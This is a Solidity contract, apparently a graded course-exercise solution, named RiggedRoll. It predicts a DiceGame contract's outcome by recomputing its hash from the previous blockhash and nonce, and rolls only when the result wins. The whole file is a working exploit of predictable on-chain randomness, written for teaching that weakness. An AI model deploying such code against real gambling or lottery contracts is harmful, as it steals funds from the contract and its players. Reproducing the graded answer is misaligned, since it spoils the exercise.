pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;
    uint256 passedEth = .002 ether;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    modifier confirmMinimum () {
        require(address(this).balance >= passedEth, "NSF, need at least 0.002 ETH");
        _;
    }

    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public confirmMinimum {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;

        // winner winner chicken dinner 
        if (roll <= 2) {
            console.log ("***** CALLING! ROLL = %s", roll);
            diceGame.rollTheDice{value: passedEth}();
        }
        else
            revert();        
    }

    //Add receive() function so contract can receive Eth
    receive() external payable { }
}
